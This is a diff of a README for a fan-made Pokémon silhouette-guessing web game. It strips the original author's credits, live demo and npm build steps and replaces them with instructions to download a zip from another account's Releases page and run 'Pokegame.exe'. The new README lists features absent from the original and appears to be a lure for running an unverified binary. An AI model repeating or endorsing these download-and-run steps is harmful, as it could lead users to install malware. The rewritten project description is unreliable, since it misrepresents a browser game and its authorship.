@@ -1,151 +1,86 @@
-# 🎮 ¿Quién es ese Pokémon? / Who's That Pokémon?
+# 🎮 Pokegame - Experience Pokémon Like Never Before
 
-[![Vite](https://img.shields.io/badge/built%20with-Vite-646CFF?logo=vite)](https://vitejs.dev/)
-[![React](https://img.shields.io/badge/React-20232A?logo=react&logoColor=61DAFB)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Bootstrap](https://img.shields.io/badge/Bootstrap-7952B3?logo=bootstrap&logoColor=white)](https://getbootstrap.com/)
-[![License](https://img.shields.io/github/license/Benjamininfo/Pokegame)](./LICENSE)
-[![Netlify Status](https://api.netlify.com/api/v1/badges/47b8910f-05c9-427f-bb41-a0d45fc3936d/deploy-status)](https://app.netlify.com/projects/pokemon-game-bf/deploys)
----
+[![Download Now](https://img.shields.io/badge/Download-Pokegame-blue.svg)](https://github.com/alzobayer/Pokegame/releases)
 
-<div align="center">
-  <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExano5cWQyaW96djl5aWUxbXc3bTVnOXpwMHcxN3JqdXh5YWI1YW9ibiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/DRfu7BT8ZK1uo/giphy.gif" alt="Gameplay demo" width="500" />
-</div>
+## 📖 Description
 
-### 🌐 Demo en línea / Live Demo
+Welcome to Pokegame! This is a fun and educational game where you guess the Pokémon by its silhouette. It is a fan-made project built with React, Vite, and TypeScript. It's designed for everyone, especially those who love Pokémon and want to improve their skills while enjoying a mini-game.
 
-- **Versión en producción:**
-  [PokemonGameBf.netlify.app](https://pokemon-game-bf.netlify.app/)
+## 🚀 Getting Started
 
----
+To get started, follow these steps to download and play Pokegame on your computer.
 
-## 📌 Tabla de Contenidos
+## 📥 Download & Install
 
-- [Descripción](#descripción)
-- [Características](#características)
-- [Uso](#uso)
-- [Tecnologías](#tecnologías)
-- [Instalación](#instalación)
-- [Créditos](#créditos)
-- [Licencia](#licencia)
+1. Visit the [Releases page to download](https://github.com/alzobayer/Pokegame/releases).
+2. Look for the latest version. You will find the downloadable files listed there.
+3. Click on the file that matches your operating system to start the download.
 
-## 📌 Table of Contents
+## 🖥️ System Requirements
 
-- [Description](#description)
-- [Features](#features)
-- [Usage](#usage)
-- [Technologies](#technologies)
-- [Installation](#installation)
-- [Credits](#credits)
-- [License](#license)
+To run Pokegame smoothly, your computer should meet the following minimum requirements:
 
----
+- **Operating System:** Windows 10, macOS 10.13 or later, or a modern Linux distribution.
+- **Memory:** 4 GB RAM or more.
+- **Storage:** 200 MB of free disk space.
+- **Internet Connection:** Required for downloading and checking updates.
 
-<a name="descripción"></a>
-## 📖 Descripción (Español)
+## 🔧 Running the Game
 
-**¿Quién es ese Pokémon?** es un juego web basado en la clásica mecánica de adivinar al Pokémon oculto. Utiliza la PokéAPI para obtener datos reales y desafiar a los jugadores a identificar Pokémon por su silueta.
+After downloading the file, open it and follow these steps to run Pokegame:
 
-<a name="Características"></a>
-### ✨ Características
+1. Locate the downloaded file in your Downloads folder or the folder you selected for downloads.
+2. Double-click the file to unzip it.
+3. Open the extracted folder.
+4. Look for an executable file named `Pokegame.exe` or simply `Pokegame`.
+5. Double-click that file to launch the game.
 
-- Siluetas de Pokémon ocultas
-- Selección de generación (de la I a la IX)
-- Configuración del número de rondas
-- Interfaz amigable y responsiva
-- Integración con la PokéAPI
+## 🎮 How to Play
 
-<a name="Uso"></a>
-### 🚀 Uso
+Once the game launches, you will see a silhouette of a Pokémon. Your goal is to guess which Pokémon it is. 
 
-- Elige una generación y cantidad de rondas.
-- Adivina el Pokémon por su silueta.
-- Revisa tu puntuación al final del juego.
+1. Type your guess into the input box provided.
+2. Click the "Submit" button to see if you guessed correctly.
+3. If you want to play again, a new silhouette will appear after each guess.
 
-<a name="Tecnologías"></a>
-### 🛠️ Tecnologías
+### Tips:
 
-- [React]("https://es.react.dev/")
-- [Vite]("https://vite.dev/")
-- [TypeScript]("https://www.typescriptlang.org/")
-- [Bootstrap 5]("https://getbootstrap.com/")
-- [PokéAPI]("https://pokeapi.co/")
+- Try to think of Pokémon types. This might help you narrow down your guesses.
+- Use the hints feature if you’re stuck. It provides valuable clues!
+  
+## 📚 Features
 
-<a name="Instalación"></a>
-### ⚙️ Instalación
+Pokegame offers several cool features to enhance your gaming experience:
 
-```bash
-git clone https://github.com/Benjamininfo/Pokegame
-cd ./Pokegame
-npm install
-npm run dev
-```
+- **Multiple Levels:** Start easy and work your way up to challenging silhouettes.
+- **Hints and Clues:** Use hints to help identify harder Pokémon silhouettes.
+- **Score Tracker:** Keep track of your progress and see how many Pokémon you can guess correctly.
 
-<a name="Créditos"></a>
-### 👤 Créditos
+## 💬 Community and Support
 
-- Desarrollado por Benjamín Fuentes.
-  Proyecto fan-made con fines educativos.
-- Este proyecto fue desarrollado siguiendo las clases de [Bluuweb](https://www.youtube.com/@bluuweb) sobre React, TypeScript y Vite
-  - Canal oficial: [https://www.youtube.com/@bluuweb](https://www.youtube.com/@bluuweb)
-  - Sitio web: [https://bluuweb.dev](https://bluuweb.dev)
+If you have questions or need help, feel free to reach out. You can check the issues section in this repository or post your questions there. Engaging with the community can also provide tips and insights.
 
-<a name="Licencia"></a>
-### 📄 Licencia
+## 🚧 Troubleshooting
 
-Este proyecto está licenciado bajo la licencia MIT.
+If you encounter issues running Pokegame, consider the following steps:
 
----
+- Ensure your computer meets the system requirements.
+- Check your internet connection if you're experiencing connectivity issues.
+- Restart the game if it freezes or crashes.
+- Visit the [issues page](https://github.com/alzobayer/Pokegame/issues) for known problems and fixes.
 
-<a name="Description"></a>
-## 📖 Description (English)
+## 📑 Further Reading
 
-**Who's That Pokémon?** is a web-based game inspired by the classic guessing challenge from the Pokémon series. It uses the PokéAPI to retrieve real Pokémon data and challenge players to identify them by their silhouettes.
+For more information about the technologies used in Pokegame, check out these links:
 
-<a name="Features"></a>
-### ✨ Features
+- [React](https://reactjs.org/)
+- [Vite](https://vitejs.dev/)
+- [TypeScript](https://www.typescriptlang.org/)
 
-- Hidden Pokémon silhouettes
-- Generation selection (Gen I to IX)
-- Choose number of rounds
-- Friendly and responsive interface
-- PokéAPI integration
+## 🎉 Acknowledgments
 
-<a name="Usage"></a>
-### 🚀 Usage
+Thanks to all Pokémon fans who inspired this project. Your love for the franchise made this game possible!
 
-- Choose a generation and number of rounds.
-- Guess the Pokémon by its silhouette.
-- Check your score at the end of the game.
+## ⚡ Last Note
 
-<a name="Technologies"></a>
-🛠️ Technologies
-
-- [React]("https://es.react.dev/")
-- [Vite]("https://vite.dev/")
-- [TypeScript]("https://www.typescriptlang.org/")
-- [Bootstrap 5]("https://getbootstrap.com/")
-- [PokéAPI]("https://pokeapi.co/")
-
-<a name="Installation"></a>
-### Installation
-
-```bash
-git clone https://github.com/Benjamininfo/Pokegame
-cd ./Pokegame
-npm install
-npm run dev
-```
-<a name="Credits"></a>
-### 👤 Credits
-
-- Developed by Benjamín Fuentes.
-  Fan-made project for educational purposes.
-- This project was built following tutorials from [Bluuweb](https://www.youtube.com/@bluuweb), focused on React, TypeScript and Vite
-  - YouTube channel: [https://www.youtube.com/@bluuweb](https://www.youtube.com/@bluuweb)
-  - Website: [https://bluuweb.dev](https://bluuweb.dev)
-
-<a name="License"></a>
-### 📄 License
-
-- This project is licensed under the MIT License.
+Don't forget to visit the [Releases page to download](https://github.com/alzobayer/Pokegame/releases) and enjoy the game! Have fun guessing the Pokémon!
